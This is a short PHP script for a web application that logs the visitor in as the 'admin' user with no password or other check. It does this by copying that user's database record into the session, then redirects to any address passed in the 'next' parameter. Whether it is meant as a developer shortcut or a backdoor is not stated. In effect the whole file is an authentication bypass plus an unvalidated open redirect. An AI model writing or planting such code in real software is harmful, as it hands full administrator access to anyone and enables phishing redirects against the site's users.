<?php
require __DIR__ . '/../app/config/bootstrap.php';
Session::start();
$u = DB::one("SELECT * FROM users WHERE username='admin' LIMIT 1");
$_SESSION['auth_user'] = array(
    'id' => (int)$u['id'], 'username' => $u['username'], 'name' => $u['name'],
    'role' => $u['role'], 'dept_ids' => $u['dept_ids'], 'photo' => $u['photo'],
    'theme' => 'auto', 'sidebar' => 'expand',
);
$next = isset($_GET['next']) ? (string)$_GET['next'] : '/admin/dashboard';
header('Location: ' . $next);
exit;
